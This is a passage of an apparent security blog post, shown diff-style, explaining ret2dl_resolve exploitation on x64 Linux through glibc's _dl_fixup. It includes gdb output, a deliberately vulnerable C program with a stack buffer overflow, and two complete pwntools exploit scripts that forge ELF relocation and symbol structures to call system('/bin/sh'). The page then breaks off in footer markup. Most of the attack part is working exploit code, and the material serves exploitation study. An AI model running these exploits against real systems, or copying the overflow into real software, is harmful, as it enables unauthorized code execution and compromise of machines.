+    <p>_dl_lookup_symbol_x, searches loaded objects’ symbol tables for a definition of the symbol in <code class="highlighter-rouge">strtab + sym-&gt;st_name</code> and returns the link_map address. l_addr points to the libc base address.</p>
+  </li>
+  <li>
+    <p><code class="highlighter-rouge">value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</code></p>
+
+    <p>DL_FIXUP_MAKE_VALUE finds the offset of the function from the library and relocates it.</p>
+  </li>
+  <li>
+    <p><code class="highlighter-rouge">return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</code></p>
+
+    <p>elf_machine_fixup_plt writes the address of the resolved symbol in the location pointed by rel_addr (In the GOT).</p>
+  </li>
+</ol>
+
+<p>Let’s move on to the exploit part!</p>
+
+<p><img src="/assets/images/ret2dl_resolve/finally.png" alt="finally" class="img-responsive" /></p>
+
+<h3 id="the-exploit">The exploit</h3>
+
+<p>Now that we know how dl-runtime.c works, write an exploit is relativey easy. We can:</p>
+
+<ol>
+  <li>
+    <p>Push a large fake reloc_arg on the stack and then jump on the plt default stub. _dl_fixup will be called with link_map and the fake reloc_arg as aguments. In this way we can make <code class="highlighter-rouge">const PLTREL *const reloc = (const void *) (D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);</code> point in our controllable area (bss/heap).</p>
+  </li>
+  <li>
+    <p>In the fake JMPREL section (in our controllable area), we create a fake Elf64_Rel structure with a large fake r_info field.
+Now we can make <code class="highlighter-rouge">const ElfW(Sym) *sym = &amp;symtab[reloc-&gt;r_info &gt;&gt; 32]</code> point in our controllable area.</p>
+  </li>
+  <li>
+    <p>Creating the fake r_info field, we need to make sure that it ends with 0x7, so the <code class="highlighter-rouge">assert ((reloc-&gt;r_info &amp; 0xffffffff) == 0x7);</code> check is satisfied.</p>
+  </li>
+  <li>
+    <p>In the fake DYNSYM section (in our controllable area), we create a fake Elf64_Sym structure with a fake st_other field set to 0x00.
+In this way the <code class="highlighter-rouge">if (__builtin_expect ((sym-&gt;st_other &amp; 0x03), 0) == 0)</code> check is satisfied.</p>
+  </li>
+  <li>
+    <p>In the same Elf64_Sym structure we create a large fake st_name field.
+In this way we can make <code class="highlighter-rouge">strtab + sym-&gt;st_name</code> point in our controllable area.</p>
+  </li>
+  <li>
+    <p>Finally, in the fake STRTAB section (in our controllable area), we write a null terminated string, for example <code class="highlighter-rouge">system\x00</code>.
+If we did the math correctly, dl-fixup will resolve the symbol we have chosen and we will get a shell!</p>
+  </li>
+</ol>
+
+<p>A problem with the x64 architecture, arises from:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">if</span> <span class="p">(</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">l_info</span><span class="p">[</span><span class="n">VERSYMIDX</span> <span class="p">(</span><span class="n">DT_VERSYM</span><span class="p">)]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">const</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Half</span><span class="p">)</span> <span class="o">*</span><span class="n">vernum</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">D_PTR</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="n">VERSYMIDX</span> <span class="p">(</span><span class="n">DT_VERSYM</span><span class="p">)]);</span>
+  <span class="n">ElfW</span><span class="p">(</span><span class="n">Half</span><span class="p">)</span> <span class="n">ndx</span> <span class="o">=</span> <span class="n">vernum</span><span class="p">[</span><span class="n">ELFW</span><span class="p">(</span><span class="n">R_SYM</span><span class="p">)</span> <span class="p">(</span><span class="n">reloc</span><span class="o">-&gt;</span><span class="n">r_info</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="mh">0x7fff</span><span class="p">;</span>
+  <span class="n">version</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">l_versions</span><span class="p">[</span><span class="n">ndx</span><span class="p">];</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">version</span><span class="o">-&gt;</span><span class="n">hash</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="n">version</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Let’s assume that the .bss, is mapped at 0x601000, and we are using 0x601a00 as starting point of our controllable area. When we fake the JMPREL section in this area, we need to compute the r_info field in the corresponding fake Elf64_Rel structure. r_info is equal to the distance between our fake .dynsym section and the real SYMTAB, divided by 0x18 (since it will be used as index to identify the corresponding Elf64_Sym structure and the size of each structure is 0x18 bytes): <code class="highlighter-rouge">(((fake_dynsym - SYMTAB) / 0x18) &lt;&lt; 32) | 0x7</code>, in our case <code class="highlighter-rouge">(((0x601a68 - 0x4002b8) / 0x18) &lt;&lt; 32) | 0x7 = 0x1565200000007</code>.</p>
+
+<p>The line <code class="highlighter-rouge">ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;</code> will result in <code class="highlighter-rouge">ElfW(Half) ndx = vernum[0x1565200000007 &gt;&gt; 32] &amp; 0x7fff;</code>. The problem is that <code class="highlighter-rouge">0x1565200000007 &gt;&gt; 32 = 0x15652</code>, and it’s a very large index.</p>
+
+<p>Let’s look at it in gdb:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mh">0x7fd3f92fea8d</span> <span class="o">&lt;</span><span class="n">_dl_fixup</span><span class="o">+</span><span class="mi">109</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">r8</span><span class="o">+</span><span class="mh">0x8</span><span class="err">]</span>
+<span class="mh">0x7fd3f92fea91</span> <span class="o">&lt;</span><span class="n">_dl_fixup</span><span class="o">+</span><span class="mi">113</span><span class="o">&gt;:</span>	<span class="k">movzx</span>  <span class="n">eax</span><span class="p">,</span><span class="n">WORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rax</span><span class="o">+</span><span class="n">rcx</span><span class="o">*</span><span class="mi">2</span><span class="err">]</span>
+<span class="mh">0x7fd3f92fea95</span> <span class="o">&lt;</span><span class="n">_dl_fixup</span><span class="o">+</span><span class="mi">117</span><span class="o">&gt;:</span>	<span class="k">and</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x7fff</span></code></pre></figure>
+
+<p><code class="highlighter-rouge">QWORD PTR [r8+0x8]</code> is a pointer in the VERSYM section, the RCX contains <code class="highlighter-rouge">0x1565200000007 &gt;&gt; 32 = 0x15652</code>. So
+<code class="highlighter-rouge">$rax + $rcx*2 = 0x400356 + 0x15652*2 = 0x42affa</code>. This address points in an invalid memory region, so the binary segfaults.</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mh">0x42affa</span><span class="o">:</span>	<span class="n">Cannot</span> <span class="n">access</span> <span class="n">memory</span> <span class="n">at</span> <span class="n">address</span> <span class="mh">0x42affa</span></code></pre></figure>
+
+<p>As we can see from <a href="http://inaz2.hatenablog.com/entry/2014/07/27/205322">this</a> article a common workaround is to leak the link_map address and write a NULL byte at <code class="highlighter-rouge">&amp;l + 0x1d0</code>, in this way, the <code class="highlighter-rouge">if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)</code> check, won’t be satisfied and the program will avoid the code in the “if” statement. Another really interesting solution comes from <a href="https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">this</a> article, but it always requires a leak.</p>
+
+<p>Now let’s assume that the .bss is mapped at 0x404000 and we decide to use 0x404700 as our controllable area, the r_info field in the corresponding fake Elf64_Rel structure will be equal to <code class="highlighter-rouge">(((fake_dynsym - SYMTAB) / 0x18) &lt;&lt; 32) | 0x7</code> in this case <code class="highlighter-rouge">(((0x404768 - 0x400328) / 0x18) &lt;&lt; 32) | 0x7 = 0x2d800000007</code>. In <code class="highlighter-rouge">ElfW(Half) ndx = vernum[0x2d800000007 &gt;&gt; 32] &amp; 0x7fff;</code>, <code class="highlighter-rouge">0x2d800000007 &gt;&gt; 32 = 0x2d8</code> and in:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mh">0x7fd3f92fea8d</span> <span class="o">&lt;</span><span class="n">_dl_fixup</span><span class="o">+</span><span class="mi">109</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">r8</span><span class="o">+</span><span class="mh">0x8</span><span class="err">]</span>
+<span class="mh">0x7fd3f92fea91</span> <span class="o">&lt;</span><span class="n">_dl_fixup</span><span class="o">+</span><span class="mi">113</span><span class="o">&gt;:</span>	<span class="k">movzx</span>  <span class="n">eax</span><span class="p">,</span><span class="n">WORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rax</span><span class="o">+</span><span class="n">rcx</span><span class="o">*</span><span class="mi">2</span><span class="err">]</span>
+<span class="mh">0x7fd3f92fea95</span> <span class="o">&lt;</span><span class="n">_dl_fixup</span><span class="o">+</span><span class="mi">117</span><span class="o">&gt;:</span>	<span class="k">and</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x7fff</span></code></pre></figure>
+
+<p><code class="highlighter-rouge">$rax + $rcx*2 = 0x4003c6 + 0x2d8*2 = 0x400976</code>, will result in a valid pointer:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mh">0x400976</span><span class="o">:</span>	<span class="mh">0x0000000000000000</span></code></pre></figure>
+
+<p>With my friend and teammate <a href="https://willsroot.io">FizzBuzz101</a>, we started to do some tests and we noticed that using the modern GCC versions, the bss is often mapped at 0x40XXXX, for example:
+gcc 8.4.0 and 9.3.0 on Kali 4, kernel 5.4.0-kali4-amd64; gcc 7.4.0 and 8.3.0 on Debian 10, kernel 4.19.0-6-amd64 and gcc 9.2.1 on Ubuntu SMP, kernel 5.3.0-51-generic and so on.</p>
+
+<p>Under this condition, we can proceed without needing any workaround.</p>
+
+<p>The vulnerable poc I used for this article is really simple:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;unistd.h&gt;
+</span>
+<span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Compiled using <strong>gcc 9.3.0</strong>: <code class="highlighter-rouge">gcc poc.c -o poc -no-pie</code></p>
+
+<p>Let’s take a look to the exploit:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">"amd64"</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"DEBUG"</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./poc"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">align</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
+    <span class="k">return</span> <span class="p">(</span><span class="mh">0x18</span> <span class="o">-</span> <span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x18</span><span class="p">)</span>
+
+<span class="c"># Sections</span>
+<span class="c"># RWAREA = .bss + N, N &gt;= 0x700, to avoid segfault</span>
+<span class="n">RW_AREA</span> <span class="o">=</span> <span class="mh">0x404000</span> <span class="o">+</span> <span class="mh">0x700</span> <span class="c"># .bss + 0x700</span>
+<span class="n">PLT</span> <span class="o">=</span> <span class="mh">0x401020</span> <span class="c"># .plt default stub</span>
+<span class="n">JMPREL</span> <span class="o">=</span> <span class="mh">0x400420</span> <span class="c"># .rela.plt section</span>
+<span class="n">SYMTAB</span> <span class="o">=</span> <span class="mh">0x400328</span> <span class="c"># .symtab section</span>
+<span class="n">STRTAB</span> <span class="o">=</span> <span class="mh">0x400388</span> <span class="c"># .strtab section</span>
+
+<span class="c"># Gadgets</span>
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x4011ab</span> <span class="c"># pop rdi; ret;</span>
+<span class="n">pop_rsi_r15</span> <span class="o">=</span> <span class="mh">0x4011a9</span> <span class="c"># pop rsi; pop r15; ret;</span>
+<span class="n">leave_ret</span> <span class="o">=</span> <span class="mh">0x401141</span> <span class="c"># leave; ret;</span>
+
+<span class="n">plt_read</span> <span class="o">=</span> <span class="mh">0x401030</span>
+<span class="n">got_read</span> <span class="o">=</span> <span class="mh">0x404018</span>
+
+<span class="c"># Fake .rela.plt</span>
+<span class="n">fake_relaplt</span> <span class="o">=</span> <span class="n">RW_AREA</span> <span class="o">+</span> <span class="mh">0x20</span> <span class="c"># Right after reloc_arg</span>
+<span class="n">fake_relaplt</span> <span class="o">+=</span> <span class="n">align</span><span class="p">(</span><span class="n">fake_relaplt</span> <span class="o">-</span> <span class="n">JMPREL</span><span class="p">)</span> <span class="c"># Alignment in x64 is 0x18</span>
+<span class="n">reloc_arg</span> <span class="o">=</span> <span class="p">(</span><span class="n">fake_relaplt</span> <span class="o">-</span> <span class="n">JMPREL</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x18</span>
+
+<span class="n">debug</span><span class="p">(</span><span class="s">"Fake .rela.plt starts at: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">fake_relaplt</span><span class="p">))</span>
+<span class="n">debug</span><span class="p">(</span><span class="s">"reloc_arg is: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">reloc_arg</span><span class="p">))</span>
+<span class="n">debug</span><span class="p">(</span><span class="s">"Expected fake .rela.plt at: hex(reloc_arg*0x18 + JMPREL) =&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">reloc_arg</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="n">JMPREL</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"-"</span><span class="o">*</span><span class="mi">80</span><span class="p">)</span>
+
+<span class="c"># Fake .symtab</span>
+<span class="n">fake_symtab</span> <span class="o">=</span> <span class="n">fake_relaplt</span> <span class="o">+</span> <span class="mh">0x18</span>
+<span class="n">fake_symtab</span> <span class="o">+=</span> <span class="n">align</span><span class="p">(</span><span class="n">fake_symtab</span> <span class="o">-</span> <span class="n">SYMTAB</span><span class="p">)</span> <span class="c"># Alignment in x64 is 0x18</span>
+<span class="n">r_info</span> <span class="o">=</span> <span class="p">(((</span><span class="n">fake_symtab</span> <span class="o">-</span> <span class="n">SYMTAB</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x18</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x7</span> <span class="c"># | 0x7 to bypass check 4.</span>
+
+<span class="n">debug</span><span class="p">(</span><span class="s">"Fake .symtab starts at: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">fake_symtab</span><span class="p">))</span>
+<span class="n">debug</span><span class="p">(</span><span class="s">"r_info is: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">r_info</span><span class="p">))</span>
+<span class="n">debug</span><span class="p">(</span><span class="s">"Expected fake .symtab at: hex(((r_info &gt;&gt; 32)*0x18) + SYMTAB) =&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(((</span><span class="n">r_info</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span><span class="o">*</span><span class="mh">0x18</span><span class="p">)</span> <span class="o">+</span> <span class="n">SYMTAB</span><span class="p">))</span> <span class="c"># *0x18 because it's used as index</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"-"</span><span class="o">*</span><span class="mi">80</span><span class="p">)</span>
+
+<span class="c"># Fake .strtab</span>
+<span class="n">fake_symstr</span> <span class="o">=</span> <span class="n">fake_symtab</span> <span class="o">+</span> <span class="mh">0x18</span>
+<span class="n">st_name</span> <span class="o">=</span> <span class="n">fake_symstr</span> <span class="o">-</span> <span class="n">STRTAB</span>
+<span class="n">bin_sh</span> <span class="o">=</span> <span class="n">fake_symstr</span> <span class="o">+</span> <span class="mh">0x8</span>
+
+<span class="n">debug</span><span class="p">(</span><span class="s">"Fake .symstr starts at: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">fake_symstr</span><span class="p">))</span>
+<span class="n">debug</span><span class="p">(</span><span class="s">"st_name is: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">st_name</span><span class="p">))</span>
+<span class="n">debug</span><span class="p">(</span><span class="s">"Expected fake .strtab at: hex(STRTAB + st_name) =&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">STRTAB</span> <span class="o">+</span> <span class="n">st_name</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"-"</span><span class="o">*</span><span class="mi">80</span><span class="p">)</span>
+
+<span class="c"># STAGE 1:</span>
+<span class="c"># A second call to read() stores the fake structures on the RW_AREA.</span>
+<span class="c"># Then, we jump on RW_AREA using stack pivoting</span>
+<span class="c"># PS: rdx already contains 0x90, so we can avoid to use ret2csu</span>
+<span class="n">stage1</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">32</span>
+<span class="n">stage1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">RW_AREA</span><span class="p">)</span> <span class="c"># We will pivot here using the leave_ret gadget</span>
+<span class="n">stage1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">stage1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_r15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">RW_AREA</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">stage1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">plt_read</span><span class="p">)</span> <span class="c"># read(0, RW_AREA + 0x8, 0x90)</span>
+<span class="n">stage1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span>
+<span class="n">stage1</span> <span class="o">+=</span> <span class="s">"X"</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x90</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">stage1</span><span class="p">))</span>
+
+<span class="c"># STAGE 2:</span>
+<span class="c"># We send the payload containing the fake structures</span>
+<span class="n">stage2</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
+<span class="n">stage2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">PLT</span><span class="p">)</span>
+<span class="n">stage2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">reloc_arg</span><span class="p">)</span>
+
+<span class="c"># Fake Elf64_Rel</span>
+<span class="n">stage2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">got_read</span><span class="p">)</span> <span class="c">#r_offset</span>
+<span class="n">stage2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">r_info</span><span class="p">)</span> <span class="c">#r_info</span>
+
+<span class="c"># Align</span>
+<span class="n">stage2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span>
+
+<span class="c"># Fake Elf64_Sym</span>
+<span class="n">stage2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">st_name</span><span class="p">)</span>
+<span class="n">stage2</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mh">0x12</span><span class="p">)</span> <span class="c"># st_info,</span>
+<span class="n">stage2</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c"># st_other -&gt; 0x00, bypass check .5</span>
+<span class="n">stage2</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c"># st_shndx</span>
+<span class="n">stage2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c"># st_value</span>
+<span class="n">stage2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c"># st_size</span>
+
+<span class="c"># Fake strings</span>
+<span class="n">stage2</span> <span class="o">+=</span> <span class="s">"system</span><span class="se">\x00\x00</span><span class="s">"</span>
+<span class="n">stage2</span> <span class="o">+=</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span>
+<span class="n">stage2</span> <span class="o">+=</span> <span class="s">"X"</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x90</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">stage2</span><span class="p">))</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">stage1</span> <span class="o">+</span> <span class="n">stage2</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
+
+<p>As Fizz pointed out, we can also avoid to pivot in the stage 1.
+We can create the fake structures on the bss, call main and overflow again.
+Here’s his version of the exploit:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">"amd64"</span>
+
+<span class="nb">bin</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./poc'</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./poc'</span><span class="p">)</span>
+
+<span class="n">PLT</span> <span class="o">=</span> <span class="mh">0x401020</span> <span class="c"># .plt section</span>
+<span class="n">JMPREL</span> <span class="o">=</span> <span class="mh">0x400420</span> <span class="c"># .rela.plt section</span>
+<span class="n">SYMTAB</span> <span class="o">=</span> <span class="mh">0x400328</span> <span class="c"># .symtab section</span>
+<span class="n">STRTAB</span> <span class="o">=</span> <span class="mh">0x400388</span> <span class="c"># .strtab section</span>
+
+<span class="n">poprdi</span> <span class="o">=</span> <span class="mh">0x4011ab</span> <span class="c"># pop rdi; ret;</span>
+<span class="n">poprsir15</span> <span class="o">=</span> <span class="mh">0x4011a9</span> <span class="c"># pop rsi; pop r15; ret;</span>
+<span class="n">leave</span> <span class="o">=</span> <span class="mh">0x401141</span> <span class="c"># leave; ret;</span>
+
+<span class="n">offset</span> <span class="o">=</span> <span class="mh">0x28</span>
+<span class="n">read</span> <span class="o">=</span> <span class="nb">bin</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'read'</span><span class="p">]</span>
+<span class="n">main</span> <span class="o">=</span> <span class="nb">bin</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>
+<span class="n">bss</span> <span class="o">=</span> <span class="mh">0x404000</span>
+
+<span class="k">def</span> <span class="nf">wait</span><span class="p">():</span>
+  <span class="n">p</span><span class="o">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+
+<span class="n">poprdi</span> <span class="o">=</span> <span class="mh">0x4011ab</span>
+<span class="n">poprsir15</span> <span class="o">=</span> <span class="mh">0x4011a9</span>
+
+<span class="n">rbp</span> <span class="o">=</span> <span class="n">bss</span> <span class="o">+</span> <span class="mh">0x900</span>
+<span class="c">#need to do math to align reloc_offset and offset to symtab aligns to 0x18</span>
+<span class="n">resolvedata</span> <span class="o">=</span> <span class="n">bss</span> <span class="o">+</span> <span class="mh">0x920</span>
+
+<span class="n">reloc_offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">resolvedata</span> <span class="o">-</span> <span class="n">JMPREL</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x18</span>
+<span class="n">evilsym</span> <span class="o">=</span> <span class="n">resolvedata</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="c">#to help fake symtab index align</span>
+
+<span class="c">#32 bit alignment was 0x10 for dl resolve stuff, 64 bit is 0x18 for align, make sure it's all aligned</span>
+<span class="n">evil</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span> <span class="c">#faking a ELF64_REL</span>
+	<span class="n">resolvedata</span><span class="p">,</span> <span class="c">#r_offset</span>
+	<span class="mh">0x7</span> <span class="o">|</span> <span class="p">((</span><span class="n">evilsym</span> <span class="o">+</span> <span class="mh">0x18</span> <span class="o">-</span> <span class="n">SYMTAB</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x18</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">,</span> <span class="c">#r_info</span>
+	<span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="c">#alignment here</span>
+	<span class="n">evilsym</span> <span class="o">+</span> <span class="mh">0x40</span> <span class="o">-</span> <span class="n">STRTAB</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
+	<span class="s">'system</span><span class="se">\x00\x00</span><span class="s">'</span><span class="p">,</span>
+	<span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span>
+	<span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">poprdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">poprsir15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">resolvedata</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="c">#gonna need rbp to be above the bare minimum because stack does operations there, trigger a read here</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">wait</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">evil</span><span class="p">)</span>
+<span class="n">ropnop</span> <span class="o">=</span> <span class="mh">0x000000000040109f</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">poprdi</span><span class="p">)</span> <span class="o">+</span>  <span class="n">p64</span><span class="p">(</span><span class="mh">0x404978</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">PLT</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">reloc_offset</span><span class="p">)</span>
+<span class="n">wait</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
+
+
+                </div>
+            </section>
+
+            <!-- Email subscribe form at the bottom of the page -->
+            
+
+            <footer class="post-full-footer">
+                <!-- Everything inside the #author tags pulls data from the author -->
+                <!-- #author-->
+                
+                    
+                        <section class="author-card">
+                            
+                                <img class="author-profile-image" src="/assets/images/ghost.png" alt="D3v17" />
+                            
+                            <section class="author-card-content">
+                                <h4 class="author-card-name"><a href="/author/D3v17">D3v17</a></h4>
+                                
+                                    <p>Read <a href="/author/D3v17">more posts</a> by this author.</p>
+                                
+                            </section>
+                        </section>
+                        <div class="post-full-footer-right">
+                            <a class="author-card-button" href="/author/D3v17">Read More</a>
+                        </div>
+                    
+                
+                <!-- /author  -->
+            </footer>
+
+            <!-- If you use Disqus comments, just uncomment this block.
+            The only thing you need to change is "test-apkdzgmqhj" - which
+            should be replaced with your own Disqus site-id. -->
+            
+
+        </article>
+
+    </div>
+</main>
+
+<!-- Links to Previous/Next posts -->
+<aside class="read-next outer">
+    <div class="inner">
+        <div class="read-next-feed">
+            
+                
+                
+                
+                
+                    <article class="read-next-card"
+                        
